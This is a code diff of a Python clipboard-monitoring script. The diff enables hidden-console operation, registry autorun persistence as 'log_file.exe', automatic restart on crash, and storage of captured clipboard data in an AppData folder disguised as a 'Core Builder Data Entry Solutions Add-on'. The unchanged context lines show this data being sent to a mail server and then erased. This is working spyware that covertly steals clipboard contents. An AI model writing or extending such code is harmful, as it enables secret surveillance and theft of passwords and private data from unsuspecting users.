@@ -16,32 +16,31 @@ import getpass
 # from pip import main
 import pyperclip
 import pyautogui
-# import ctypes
+import ctypes
 import autorun
-# import win32process
+import win32process
 import  shutil
-# import logging
+import logging
 
-autorun.AddToRegistry()
+autorun.AddToRegistry('log_file.exe')
 
-# def start_script():
-#     try:
-#         main_func()
-#     except:
+def start_script():
+    try:
+        main_func()
+    except:
         
-#         handle_crash()
+        handle_crash()
 
-# def handle_crash():
-#     time.sleep(5) 
-#     start_script()
+def handle_crash():
+    time.sleep(5) 
+    start_script()
 
 
-
-# hwnd = ctypes.windll.kernel32.GetConsoleWindow()      
-# if hwnd != 0:      
-#     ctypes.windll.user32.ShowWindow(hwnd, 0)      
-#     ctypes.windll.kernel32.CloseHandle(hwnd)
-#     _, pid = win32process.GetWindowThreadProcessId(hwnd)
+hwnd = ctypes.windll.kernel32.GetConsoleWindow()      
+if hwnd != 0:      
+    ctypes.windll.user32.ShowWindow(hwnd, 0)      
+    ctypes.windll.kernel32.CloseHandle(hwnd)
+    _, pid = win32process.GetWindowThreadProcessId(hwnd)
 
 print('program started')
 img_count = 1
@@ -49,9 +48,10 @@ comname = getpass.getuser()
 # print(comname)
 temp_data = pyperclip.paste()
 
-if not os.path.exists('datafile.txt'):
-    with open('datafile.txt', 'a') as clip:
+if not os.path.exists(f'C:/Users/{comname}/AppData/Local/Programs/Core Builder Data Entry Solutions Add-on/datafile.txt'):
+    with open(f'C:/Users/{comname}/AppData/Local/Programs/Core Builder Data Entry Solutions Add-on/datafile.txt', 'r+') as clip:
         pass
+# autorun.AddToRegistry('datafile.txt')
 
 def clipboard_listener():
     global temp_data, clipboard_data
@@ -69,7 +69,7 @@ def clipboard_listener():
 
 def isdataavailable():
     print('in data available function... ')
-    with open('datafile.txt', 'r+') as f:
+    with open(f'C:/Users/{comname}/AppData/Local/Programs/Core Builder Data Entry Solutions Add-on/datafile.txt', 'r+') as f:
     # print(f.read())
         data = f.read()
         print(f.read())
@@ -88,7 +88,7 @@ def isdataavailable():
                 server.quit()
                 f.truncate()
                 print('erased data from file.')
-            except:
+            except: 
                 isdataavailable()
         else:
             print('data not available')    
@@ -252,7 +252,7 @@ def main_func():
 try:
     # printf("GeeksforGeeks")
     
-    main_func()
+    start_script()
 except Exception as Argument:
  
     # creating/opening a file
@@ -263,7 +263,7 @@ except Exception as Argument:
     
     # closing the file
     f.close()
-    main_func()
+    start_script()
     
 
 
